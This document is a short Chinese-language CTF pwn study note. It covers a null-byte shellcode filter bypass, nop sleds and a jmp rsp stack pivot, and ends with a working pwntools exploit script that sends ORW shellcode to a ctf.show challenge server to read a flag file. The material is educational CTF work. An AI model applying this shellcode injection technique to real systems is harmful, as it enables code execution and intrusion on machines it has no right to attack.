# 空字节绕过
```c
__int64 __fastcall check(_BYTE *a1)
{
    const char *i; // [rsp+18h] [rbp-10h]

    while ( *a1 )
    {
        for ( i = aZzjLovesShellC; *i && *i != *a1; ++i )
            ;
        if ( !*i )
            return 0LL;
        ++a1;
    }
    return 1LL;
}
```

在 shellcode 前面加上 \x00 开头的不影响 shellcode 的汇编指令就可以了

```c
add al , al //\x00\xc0
```

## Nop sled（空操作雪橇）
具体是指在shellcode前放上一大堆nop指令，让一定范围内的地址都可以顺着nop指令执行到shellcode

细节：nop指令的个数一定得是字长的整数倍，

要对齐指令，不然到了shellcode就错位了

> nop指令的字节码是0x90
>
> 在scanf(%p)接收的情况下要用hex()来发送int整数
>

有jmp rsp和一块可读写的内存：

1. 先用jmp rsp执行跟在后面的sub rsp , 0x30 ; jmp rsp
2. 跳转到栈上前面布置的shellcode向可读写内存写入orw
3. 在前面布置的shellcode后面记得加上跳转可读写内存的语句

```plain
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("pwn.challenge.ctf.show",28262)

link.recvuntil(b'Now you can use ORW to do')

mmap=0x123000
jmp_rsp=0x0000000000400A01

mmap_shellcode=asm(shellcraft.open("./ctfshow_flag"))+asm(shellcraft.read(3,mmap, 0x100))+asm(shellcraft.write(1, mmap, 0x100))

shellcode=asm(shellcraft.read(0, mmap, 0x100))+asm('''mov rax, 0x123000; jmp rax''')
shellcode=shellcode.ljust(0x28,b'a')
payload=shellcode + p64(jmp_rsp) + asm('''sub rsp , 0x30 ; jmp rsp''')
link.sendline(payload)

link.sendline(mmap_shellcode)

link.interactive()
```
